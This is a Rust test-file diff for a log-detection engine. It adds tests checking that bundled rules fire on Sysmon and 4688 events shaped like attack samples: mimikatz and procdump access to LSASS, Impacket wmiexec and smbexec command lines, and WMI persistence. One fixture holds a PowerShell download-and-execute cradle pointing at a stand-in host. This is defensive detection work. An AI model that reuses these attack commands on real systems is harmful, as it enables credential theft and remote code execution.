@@ -1073,10 +1073,12 @@ fn provider_name_rule_fires_on_real_shaped_7045() {
     );
 }
 
-/// Every bundled rule has a viability profile, and only the one documented rule is
-/// Sysmon-only (it keys on OriginalFileName, which 4688 never carries). Kept bundled:
-/// it fires wherever Sysmon is installed, and the run reports it as not runnable
-/// elsewhere.
+/// Every bundled rule has a viability profile, and only the documented rules are
+/// Sysmon-only: Renamed Whoami (it keys on OriginalFileName, which 4688 never
+/// carries), the LSASS process-access rules (Sysmon 10) and the WMI event
+/// subscription rules (Sysmon 19 / 20 / 21). Kept bundled: they fire wherever Sysmon
+/// is installed, and the run reports them as not runnable elsewhere. The Impacket and
+/// WmiPrvSE process_creation rules also run on 4688.
 #[test]
 fn bundled_rules_viability_profiles() {
     let engine = load_bundled();
@@ -1090,7 +1092,44 @@ fn bundled_rules_viability_profiles() {
         .filter(|p| p.sysmon_only())
         .map(|p| p.title.as_str())
         .collect();
-    assert_eq!(sysmon_only, vec!["Renamed Whoami Execution"]);
+    let mut sysmon_only = sysmon_only;
+    sysmon_only.sort_unstable();
+    assert_eq!(
+        sysmon_only,
+        vec![
+            "HackTool - Generic Process Access",
+            "LSASS Memory Access by Tool With Dump Keyword In Name",
+            "Lsass Memory Dump via Comsvcs DLL",
+            "Potential Credential Dumping Activity Via LSASS",
+            "Potentially Suspicious GrantedAccess Flags On LSASS",
+            "Renamed Whoami Execution",
+            "Suspicious Encoded Scripts in a WMI Consumer",
+            "Suspicious Scripting in a WMI Consumer",
+            "WMI Event Subscription",
+        ]
+    );
+    for title in [
+        "HackTool - Potential Impacket Lateral Movement Activity",
+        "Suspicious WmiPrvSE Child Process",
+    ] {
+        let p = engine
+            .profiles()
+            .iter()
+            .find(|p| p.title == title)
+            .unwrap_or_else(|| panic!("{title} not bundled"));
+        assert!(
+            p.alternatives.iter().any(|a| a.channel == "Security"),
+            "{title} should also run on 4688"
+        );
+    }
+    // WMI rules resolve to all three Sysmon WMI events.
+    let wmi = engine
+        .profiles()
+        .iter()
+        .find(|p| p.title == "WMI Event Subscription")
+        .unwrap();
+    let eids: Vec<u32> = wmi.alternatives.iter().map(|a| a.event_id).collect();
+    assert_eq!(eids, vec![19, 20, 21]);
     // Each process_creation rule that can run on 4688 says whether it needs the
     // command line: msxsl matches on Image alone.
     let msxsl = engine
@@ -1107,4 +1146,326 @@ fn bundled_rules_viability_profiles() {
         security.requirements.iter().copied().collect::<Vec<_>>(),
         vec![cairn_core::observation::LoggingRequirement::ProcessCreationAudit]
     );
+}
+
+// --- Sysmon process access (EID 10) and WMI event subscriptions (EID 19-21) ---
+
+/// A Sysmon event with the given EventID and fields.
+fn sysmon_event(event_id: u32, fields: serde_json::Value) -> EventRecord {
+    let serde_json::Value::Object(mut map) = fields else {
+        panic!("fields must be a JSON object");
+    };
+    map.insert("EventID".into(), serde_json::json!(event_id));
+    EventRecord {
+        ts: Utc::now(),
+        channel: "Microsoft-Windows-Sysmon/Operational".into(),
+        event_id,
+        provider: "Microsoft-Windows-Sysmon".into(),
+        computer: "WS01".into(),
+        record_id: 1,
+        data: map,
+    }
+}
+
+fn titles_of(engine: &Engine, ev: &EventRecord) -> Vec<String> {
+    let hits = engine.match_event(ev).unwrap();
+    for h in &hits {
+        assert!(
+            h.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+            "{} without author",
+            h.title
+        );
+    }
+    hits.into_iter().map(|f| f.title).collect()
+}
+
+/// Real field shape: EVTX-ATTACK-SAMPLES `sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx`.
+#[test]
+fn mimikatz_lsass_access_fires_hacktool_rule() {
+    let engine = load_bundled();
+    let ev = sysmon_event(
+        10,
+        json!({
+            "SourceImage": r"C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe",
+            "TargetImage": r"C:\Windows\system32\lsass.exe",
+            "GrantedAccess": "0x1010",
+            "CallTrace": r"C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185|C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe+5c5a9",
+        }),
+    );
+    let t = titles_of(&engine, &ev);
+    assert!(
+        t.iter().any(|x| x == "HackTool - Generic Process Access"),
+        "{t:?}"
+    );
+}
+
+/// Real field shape: `CA_sysmon_hashdump_cmd_meterpreter.evtx` (PROCESS_ALL_ACCESS
+/// 0x1f1fff from a binary on a network share).
+#[test]
+fn suspicious_access_mask_on_lsass_fires() {
+    let engine = load_bundled();
+    let ev = sysmon_event(
+        10,
+        json!({
+            "SourceImage": r"\\VBOXSVR\HTools\voice_mail.msg.exe",
+            "TargetImage": r"C:\Windows\system32\lsass.exe",
+            "GrantedAccess": "0x1f1fff",
+            "CallTrace": r"C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185|UNKNOWN(01B51606)",
+        }),
+    );
+    let t = titles_of(&engine, &ev);
+    assert!(
+        t.iter()
+            .any(|x| x == "Potentially Suspicious GrantedAccess Flags On LSASS"),
+        "{t:?}"
+    );
+    // MiniDump through dbghelp with PROCESS_ALL_ACCESS.
+    let dump = sysmon_event(
+        10,
+        json!({
+            "SourceImage": r"C:\Users\Public\procdump64.exe",
+            "TargetImage": r"C:\Windows\system32\lsass.exe",
+            "GrantedAccess": "0x1fffff",
+            "CallTrace": r"C:\Windows\SYSTEM32\ntdll.dll+9d204|C:\Windows\System32\dbghelp.dll+1a2b",
+        }),
+    );
+    let t = titles_of(&engine, &dump);
+    assert!(
+        t.iter()
+            .any(|x| x == "Potential Credential Dumping Activity Via LSASS"),
+        "{t:?}"
+    );
+    assert!(
+        t.iter()
+            .any(|x| x == "LSASS Memory Access by Tool With Dump Keyword In Name"),
+        "{t:?}"
+    );
+    // rundll32 comsvcs.dll MiniDump.
+    let comsvcs = sysmon_event(
+        10,
+        json!({
+            "SourceImage": r"C:\Windows\System32\rundll32.exe",
+            "TargetImage": r"C:\Windows\system32\lsass.exe",
+            "GrantedAccess": "0x1fffff",
+            "CallTrace": r"C:\Windows\SYSTEM32\ntdll.dll+9d204|C:\Windows\System32\comsvcs.dll+3c0b",
+        }),
+    );
+    let t = titles_of(&engine, &comsvcs);
+    assert!(
+        t.iter().any(|x| x == "Lsass Memory Dump via Comsvcs DLL"),
+        "{t:?}"
+    );
+}
+
+/// Defender and a query-only access (0x1000) from System32 stay quiet.
+#[test]
+fn benign_lsass_access_fires_nothing() {
+    let engine = load_bundled();
+    for (src, mask) in [
+        (
+            r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2109.6-0\MsMpEng.exe",
+            "0x1010",
+        ),
+        (r"C:\Windows\system32\svchost.exe", "0x1000"),
+        (r"C:\Program Files\VendorAV\agent.exe", "0x1410"),
+    ] {
+        let ev = sysmon_event(
+            10,
+            json!({
+                "SourceImage": src,
+                "TargetImage": r"C:\Windows\system32\lsass.exe",
+                "GrantedAccess": mask,
+                "CallTrace": r"C:\Windows\SYSTEM32\ntdll.dll+9d204|C:\Windows\System32\KERNELBASE.dll+2be3e",
+                "SourceUser": r"NT AUTHORITY\SYSTEM",
+            }),
+        );
+        let t = titles_of(&engine, &ev);
+        assert!(t.is_empty(), "{src}: {t:?}");
+    }
+}
+
+/// Real field shapes: `sysmon_20_21_1_CommandLineEventConsumer.evtx` and
+/// `wmighost_sysmon_20_21_1.evtx` (Destination / Consumer values keep their quotes).
+#[test]
+fn wmi_consumer_creation_fires() {
+    let engine = load_bundled();
+    let consumer = sysmon_event(
+        20,
+        json!({
+            "Operation": "Created",
+            "User": r"IEWIN7\IEUser",
+            "Name": r#" "BotConsumer23""#,
+            "Type": "Command Line",
+            "Destination": r#" "c:\\Windows\\System32\\cmd.exe""#,
+        }),
+    );
+    let t = titles_of(&engine, &consumer);
+    assert_eq!(t, vec!["WMI Event Subscription".to_string()]);
+    let binding = sysmon_event(
+        21,
+        json!({
+            "Operation": "Created",
+            "Consumer": r#" "CommandLineEventConsumer.Name=\"BotConsumer23\"""#,
+            "Filter": r#" "__EventFilter.Name=\"BotFilter82\"""#,
+        }),
+    );
+    assert_eq!(
+        titles_of(&engine, &binding),
+        vec!["WMI Event Subscription".to_string()]
+    );
+    let filter = sysmon_event(
+        19,
+        json!({
+            "Operation": "Created",
+            "EventNamespace": r#" "root\\cimv2""#,
+            "Name": r#" "BotFilter82""#,
+            "Query": r#" "SELECT * FROM __InstanceModificationEvent WITHIN 10""#,
+        }),
+    );
+    assert!(titles_of(&engine, &filter).contains(&"WMI Event Subscription".to_string()));
+    // A scripted consumer that downloads and runs code.
+    let script = sysmon_event(
+        20,
+        json!({
+            "Operation": "Created",
+            "Name": r#" "Updater""#,
+            "Type": "Script",
+            "Destination": r#" "powershell -nop -c IEX (new-object net.webclient).downloadstring('http://x/a')""#,
+        }),
+    );
+    let t = titles_of(&engine, &script);
+    assert!(
+        t.iter()
+            .any(|x| x == "Suspicious Scripting in a WMI Consumer"),
+        "{t:?}"
+    );
+    // A consumer carrying a base64 PE.
+    let pe = base64_of(b"MZ\x90\x00 This program cannot be run in DOS mode.");
+    let encoded = sysmon_event(
+        20,
+        json!({
+            "Operation": "Created",
+            "Type": "Script",
+            "Destination": format!("var p = \"{pe}\";"),
+        }),
+    );
+    let t = titles_of(&engine, &encoded);
+    assert!(
+        t.iter()
+            .any(|x| x == "Suspicious Encoded Scripts in a WMI Consumer"),
+        "{t:?}"
+    );
+}
+
+/// A Sysmon 1 / 5 / 13 event is not a WMI event: the wmi_event rules stay quiet on it.
+#[test]
+fn wmi_rules_ignore_other_sysmon_events() {
+    let engine = load_bundled();
+    let ev = sysmon_event(
+        13,
+        json!({
+            "EventType": "SetValue",
+            "TargetObject": r"HKCR\ms-browser\shell\open\command\(Default)",
+            "Details": "cmd.exe /c notepad.exe",
+        }),
+    );
+    assert!(!titles_of(&engine, &ev).iter().any(|t| t.contains("WMI")));
+}
+
+/// Standard base64 (no padding trimming), for the encoded-consumer test.
+fn base64_of(bytes: &[u8]) -> String {
+    const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut out = String::new();
+    for chunk in bytes.chunks(3) {
+        let b = [
+            chunk[0],
+            chunk.get(1).copied().unwrap_or(0),
+            chunk.get(2).copied().unwrap_or(0),
+        ];
+        let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
+        for i in 0..4 {
+            if i <= chunk.len() {
+                out.push(A[((n >> (18 - 6 * i)) & 63) as usize] as char);
+            } else {
+                out.push('=');
+            }
+        }
+    }
+    out
+}
+
+/// Real shapes: Impacket wmiexec (WmiPrvSE parent, `LM_wmiexec_impacket_sysmon_whoami.evtx`)
+/// and dcomexec (mmc parent) in Sysmon 1, and smbexec in a Windows 10 4688.
+#[test]
+fn impacket_lateral_movement_fires() {
+    let engine = load_bundled();
+    let wmiexec = proc_creation(json!({
+        "Image": r"C:\Windows\System32\cmd.exe",
+        "CommandLine": r"cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1",
+        "ParentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
+        "ParentCommandLine": r"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",
+    }));
+    let t = titles_of(&engine, &wmiexec);
+    assert!(
+        t.iter()
+            .any(|x| x == "HackTool - Potential Impacket Lateral Movement Activity"),
+        "{t:?}"
+    );
+    let dcomexec = proc_creation(json!({
+        "Image": r"C:\Windows\System32\cmd.exe",
+        "CommandLine": r#""C:\Windows\System32\cmd.exe" /Q /c cd  1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1"#,
+        "ParentImage": r"C:\Windows\System32\mmc.exe",
+    }));
+    assert!(titles_of(&engine, &dcomexec)
+        .iter()
+        .any(|x| x == "HackTool - Potential Impacket Lateral Movement Activity"));
+    let smbexec = security_event(
+        4688,
+        json!({
+            "NewProcessName": r"C:\Windows\System32\cmd.exe",
+            "ParentProcessName": r"C:\Windows\System32\services.exe",
+            "CommandLine": r"C:\Windows\system32\cmd.exe /Q /c echo tasklist ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat",
+        }),
+    );
+    assert!(titles_of(&engine, &smbexec)
+        .iter()
+        .any(|x| x == "HackTool - Potential Impacket Lateral Movement Activity"));
+}
+
+/// Real shape: `LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx` (WmiPrvSE ->
+/// rundll32 url.dll handler); WerFault and `msiexec /i` under WmiPrvSE stay quiet.
+#[test]
+fn wmiprvse_suspicious_child_fires_benign_does_not() {
+    let engine = load_bundled();
+    let wmi = r"C:\Windows\System32\wbem\WmiPrvSE.exe";
+    let bad = proc_creation(json!({
+        "Image": r"C:\Windows\System32\rundll32.exe",
+        "CommandLine": "rundll32 url.dll,FileProtocolHandler ms-browser://",
+        "ParentImage": wmi,
+    }));
+    assert!(titles_of(&engine, &bad)
+        .iter()
+        .any(|x| x == "Suspicious WmiPrvSE Child Process"));
+    for (image, cmd) in [
+        (
+            r"C:\Windows\System32\WerFault.exe",
+            "WerFault.exe -u -p 4242",
+        ),
+        (
+            r"C:\Windows\System32\msiexec.exe",
+            r"msiexec.exe /i C:\Deploy\agent.msi /qn",
+        ),
+    ] {
+        let ev = proc_creation(json!({
+            "Image": image,
+            "CommandLine": cmd,
+            "ParentImage": wmi,
+        }));
+        assert!(
+            !titles_of(&engine, &ev)
+                .iter()
+                .any(|x| x == "Suspicious WmiPrvSE Child Process"),
+            "{image}"
+        );
+    }
 }
